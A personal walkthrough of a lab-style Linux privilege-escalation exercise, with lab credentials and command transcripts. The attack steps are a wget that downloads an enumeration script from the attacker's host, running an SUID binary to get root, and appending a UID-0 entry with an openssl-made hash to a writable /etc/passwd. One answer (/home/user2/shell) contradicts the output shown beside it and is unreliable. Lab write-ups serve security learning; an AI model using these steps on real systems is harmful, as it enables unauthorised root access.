export IP: 10.10.121.59

```
user:user3
password:password

```

ssh user3@10.10.121.59

```
1. ssh to machine then verify if target can ping back attacker

user3@polobox:~$ ping 10.2.77.171
PING 10.2.77.171 (10.2.77.171) 56(84) bytes of data.
64 bytes from 10.2.77.171: icmp_seq=1 ttl=61 time=367 ms
^C
--- 10.2.77.171 ping statistics ---
2 packets transmitted, 1 received, 50% packet loss, time 1001ms
rtt min/avg/max/mdev = 367.411/367.411/367.411/0.000 ms
user3@polobox:~$ 
```

2. set up http server on /ken/LinEnum on port 8080. We will be copying the shell to our target machine

```
user3@polobox:~$ wget "http://10.2.77.171:8080/LinEnum.sh"
--2022-08-10 07:53:34--  http://10.2.77.171:8080/LinEnum.sh
Connecting to 10.2.77.171:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 46631 (46K) [text/x-sh]
Saving to: ‘LinEnum.sh’

LinEnum.sh                    100%[==============================================>]  45.54K  60.0KB/s    in 0.8s    

2022-08-10 07:53:35 (60.0 KB/s) - ‘LinEnum.sh’ saved [46631/46631]

user3@polobox:~$ 

```

Questions:

First, lets SSH into the target machine, using the credentials user3:password. This is to simulate getting a foothold on the system as a normal privilege user.


What is the target's hostname?

```
[-] Hostname:
polobox
```
Look at the output of /etc/passwd how many "user[x]" are there on the system?
Ans. 8

```

user1:x:1000:1000:user1,,,:/home/user1:/bin/bash
user2:x:1001:1001:user2,,,:/home/user2:/bin/bash
user3:x:1002:1002:user3,,,:/home/user3:/bin/bash
user4:x:1003:1003:user4,,,:/home/user4:/bin/bash
statd:x:120:65534::/var/lib/nfs:/usr/sbin/nologin
user5:x:1004:1004:user5,,,:/home/user5:/bin/bash
user6:x:1005:1005:user6,,,:/home/user6:/bin/bash
mysql:x:121:131:MySQL Server,,,:/var/mysql:/bin/bash
user7:x:1006:0:user7,,,:/home/user7:/bin/bash
user8:x:1007:1007:user8,,,:/home/user8:/bin/bash
sshd:x:122:65534::/run/sshd:/usr/sbin/nologin


```

How many available shells are there on the system?
Ans. 4

```
[-] Available shells:
# /etc/shells: valid login shells
/bin/sh
/bin/dash
/bin/bash
/bin/rbash

```

What is the name of the bash script that is set to run every 5 minutes by cron?
Ans. autoscript.sh

```

[-] Crontab contents:
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
*/5  *    * * * root    /home/user4/Desktop/autoscript.sh
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#

```

What critical file has had its permissions changed to allow some users to write to it?

```
/etc/passwd

```


Well done! Bear the results of the enumeration stage in mind as we continue to exploit the system!


===================


What is the path of the file in user3's directory that stands out to you?
Ans. /home/user2/shell

```
user3@polobox:~$ find / -perm -u=s -type f 2>/dev/null
/sbin/mount.nfs
/sbin/mount.ecryptfs_private
/sbin/mount.cifs
/usr/sbin/pppd
/usr/bin/gpasswd
/usr/bin/pkexec
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/traceroute6.iputils
/usr/bin/chfn
/usr/bin/arping
/usr/bin/newgrp
/usr/bin/sudo
/usr/lib/xorg/Xorg.wrap
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/bin/ping
/bin/su
/bin/ntfs-3g
/bin/mount
/bin/umount
/bin/fusermount
/home/user5/script
/home/user3/shell
user3@polobox:~$ 

```


We know that "shell" is an SUID bit file, therefore running it will run the script as a root user! Lets run it!

We can do this by running: "./shell"

```

user3@polobox:~$ ./shell
You Can't Find Me
Welcome to Linux Lite 4.4 user3
 
Wednesday 10 August 2022, 08:14:27
Memory Usage: 337/1991MB (16.93%)
Disk Usage: 6/217GB (3%)
Support - https://www.linuxliteos.com/forums/ (Right click, Open Link)
 
root@polobox:~# 


```



Congratulations! You should now have a shell as root user, well done!

================


First, let's exit out of root from our previous task by typing "exit". Then use "su" to swap to user7, with the password "password"



Having read the information above, what direction privilege escalation is this attack?
Ans. Vertical

=========
at this point, the machine broke; ssh connection refused
new IP: 10.10.154.204


export IP = 10.10.154.204

ssh user3@10.10.154.204


Before we add our new user, we first need to create a compliant password hash to add! We do this by using the command: "openssl passwd -1 -salt [salt] [password]"

What is the hash created by using this command with the salt, "new" and the password "123"?
Ans. $1$new$p7ptkEKU1HnaHpRtzNizS1

```
┌──(kali㉿kali)-[~/ken/brainstack/privesec]
└─$ openssl passwd -1 -salt new 123
$1$new$p7ptkEKU1HnaHpRtzNizS1

```

Great! Now we need to take this value, and create a new root user account. What would the /etc/passwd entry look like for a root user with the username "new" and the password hash we created before?

new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash


Great! Now you've got everything you need. Just add that entry to the end of the /etc/passwd file!


```

user7@polobox:/home/user3$ sudo nano /etc/passwd
[sudo] password for user7: 
user7 is not in the sudoers file.  This incident will be reported.
user7@polobox:/home/user3$ nano /etc/passwd

# insert new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash at the end of the file

user7@polobox:/home/user3$ su new
Password: 
Welcome to Linux Lite 4.4
 
You are running in superuser mode, be very careful.
 
Wednesday 10 August 2022, 09:50:31
Memory Usage: 335/1991MB (16.83%)
Disk Usage: 6/217GB (3%)

root@polobox:/home/user3# whoami
root
root@polobox:/home/user3# pwd
/home/user3
root@polobox:/home/user3# 

```


Now, use "su" to login as the "new" account, and then enter the password. If you've done everything correctly- you should be greeted by a root prompt! Congratulations!


